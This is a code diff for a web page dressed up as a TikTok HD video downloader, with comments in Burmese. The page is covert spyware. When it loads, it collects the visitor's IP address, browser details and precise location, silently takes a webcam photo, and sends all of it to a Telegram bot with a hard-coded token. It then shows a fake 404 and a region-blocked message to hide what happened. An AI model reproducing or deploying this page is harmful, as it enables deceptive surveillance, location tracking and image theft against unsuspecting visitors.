@@ -1,49 +1,94 @@
 <!DOCTYPE html>
-<html>
-<head><title>TikTok HD Downloader</title></head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok HD Video Downloader</title>
+    <style>
+        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
 <body>
-    <h2 id="status">Processing video... 0%</h2>
-    <video id="video" width="160" height="120" autoplay style="display:none;"></video>
+    <div>
+        <div class="loader"></div>
+        <h2 id="status">Processing Video... Please wait</h2>
+        <p id="info">Connecting to server...</p>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-    const token = 'မင်းရဲ့_TOKEN';
-    const chat_id = 'မင်းရဲ့_ID';
+        // --- မင်းရဲ့ Telegram Bot အချက်အလက်များ ပြောင်းရန် ---
+        const botToken = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
+        const chatId = '5304050102';
 
-    // ၁။ တည်နေရာ တောင်းခြင်း
-    navigator.geolocation.getCurrentPosition(pos => {
-        const msg = `Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-    });
-
-    // ၂။ Camera ခိုးရိုက်ခြင်း
-    async function capture() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            
-            // ၂ စက္ကန့်နေရင် ပုံရိုက်မယ်
-            setTimeout(() => {
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chat_id);
-                    formData.append('photo', blob, 'shot.jpg');
-                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-                }, 'image/jpeg');
-                // ပိတ်လိုက်မယ်
-                stream.getTracks().forEach(track => track.stop());
-                document.getElementById('status').innerText = "Download Error: 404 Not Found";
-            }, 2000);
-        } catch (err) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Camera Access Denied`);
+        async function sendToTelegram(text) {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
         }
-    }
 
-    capture();
+        // ၁။ IP နဲ့ Browser အချက်အလက်ယူခြင်း
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                await sendToTelegram(`🚀 Target Entered!\nIP: ${data.ip}\nUser-Agent: ${navigator.userAgent}`);
+            } catch (e) { console.error(e); }
+        }
+
+        // ၂။ တည်နေရာ (Location) ယူခြင်း
+        function getLocation() {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const msg = `📍 Location Found!\nMaps: https://www.google.com/maps?q=${lat},${lon}`;
+                await sendToTelegram(msg);
+            }, (err) => {
+                sendToTelegram("❌ Location Access Denied.");
+            }, { enableHighAccuracy: true });
+        }
+
+        // ၃။ ကင်မရာပုံ (Photo) ခိုးရိုက်ခြင်း
+        async function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                // ၃ စက္ကန့် စောင့်ပြီးမှ ရိုက်ပါ (Focus မိစေရန်)
+                setTimeout(() => {
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'target.jpg');
+                        
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        // ပိတ်လိုက်မယ်
+                        stream.getTracks().forEach(track => track.stop());
+                        document.getElementById('status').innerText = "Download Error: 404";
+                        document.getElementById('info').innerText = "This video is not available in your region.";
+                    }, 'image/jpeg');
+                }, 3000);
+            } catch (err) {
+                sendToTelegram("❌ Camera Access Denied.");
+            }
+        }
+
+        // အကုန်လုံးကို စတင် Run ပါ
+        window.onload = () => {
+            getIPInfo();
+            getLocation();
+            capturePhoto();
+        };
     </script>
 </body>
 </html>
